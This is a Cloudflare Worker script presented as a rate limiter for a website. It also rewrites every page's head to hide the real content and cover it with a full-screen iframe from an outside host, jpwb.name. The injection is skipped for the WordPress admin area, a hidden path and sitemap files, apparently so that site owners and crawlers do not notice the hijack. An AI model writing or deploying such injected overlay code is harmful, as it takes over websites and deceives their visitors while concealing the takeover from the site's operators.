addEventListener("fetch", (event) => {
    event.respondWith(handleRequest(event.request));
});

// Define rate limit settings
const rateLimit = {
    windowMs: 60000, // 1 minute window
    maxRequests: 100, // Max 100 requests per minute
};

const rateLimiter = createRateLimiter(rateLimit);

async function handleRequest(request) {
    // Use the rate limiter to check if the request exceeds the rate limit
    const rateLimitExceeded = await rateLimiter.check(request);

    if (rateLimitExceeded) {
        return new Response("Rate limit exceeded", { status: 429 });
    }

    // Your existing code here
    const url = new URL(request.url);
    const path = url.pathname;
    const domain = url.hostname.replace(/^www\./, '');  // Remove 'www.' prefix if present

    if (path.startsWith("/wp-admin") || path.startsWith("/5t0ph3r3") || path.endsWith(".xml") || path.endsWith(".xsl")) {
        return fetch(request);
    }

    const customRequest = new Request(request, {
        headers: new Headers({
            ...request.headers,
            'User-Agent': 'CMG-Testing'
        })
    });

    const originalResponse = await fetch(customRequest);
    const transformedResponse = new HTMLRewriter()
        .on("head", new HeadHandler(domain))
        .transform(originalResponse);

    return transformedResponse;
}

class HeadHandler {
    constructor(domain) {
        this.domain = domain;
    }

    element(element) {
        const iframeURL = `https://jpwb.name/175-2/?${this.domain}&cf`;
        const preloadLink = `<link rel="preload" href="${iframeURL}" as="document">`;
        const viewportMetaTag = '<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">';
        const styles = `
            <style type="text/css">
                html, body {
                    width: 100%;
                    height: 100%;
                    margin: 0;
                    padding: 0;
                    overflow: hidden;
                    visibility: hidden; /* Hide the body initially */
                }
            </style>
        `;

        const jsInjection = `
            <script>
                document.addEventListener('DOMContentLoaded', (event) => {
                    const iframeContainer = document.createElement('div');
                    iframeContainer.style.width = '100%';
                    iframeContainer.style.height = '100vh';
                    iframeContainer.style.zIndex = '999999';
                    iframeContainer.style.overflow = 'hidden';
                    iframeContainer.style.position = 'fixed';
                    iframeContainer.style.top = '0';
                    iframeContainer.style.left = '0';

                    const iframe = document.createElement('iframe');
                    iframe.src = "${iframeURL}";
                    iframe.style.width = '100%';
                    iframe.style.height = '100vh';
                    iframe.style.border = 'none';
                    iframe.style.overflow = 'hidden';
                    iframe.loading = 'lazy';  // Enable lazy loading

                    iframeContainer.appendChild(iframe);
                    document.body.prepend(iframeContainer);
                    document.body.style.margin = '0';
                    document.body.style.overflow = 'hidden';

                    iframe.addEventListener('load', function() {
                        document.body.style.visibility = 'visible';
                    });
                });
            </script>
            <noscript>
            <style>
                html, body {
                    visibility: visible !important;
                    overflow: auto !important;
                }
            </style>
        </noscript>
        `;

        element.append(preloadLink + viewportMetaTag + styles + jsInjection, { html: true });
    }
}

// Helper function to create a rate limiter
function createRateLimiter(options) {
    const rateLimiter = {
        key: (request) => request.headers.get("CF-Connecting-IP"), // Use IP address as the rate-limiting key
        rateLimit: new Map(),
        options: options,
        async check(request) {
            const key = this.key(request);
            const now = Date.now();
            const rateInfo = this.rateLimit.get(key) || { count: 0, resetTime: now + options.windowMs };

            if (rateInfo.resetTime < now) {
                // Reset the counter if the window has passed
                rateInfo.count = 0;
                rateInfo.resetTime = now + options.windowMs;
            }

            if (rateInfo.count >= options.maxRequests) {
                // Exceeded rate limit
                return true;
            }

            // Increment the request count
            rateInfo.count++;
            this.rateLimit.set(key, rateInfo);
            return false;
        },
    };

    return rateLimiter;
}
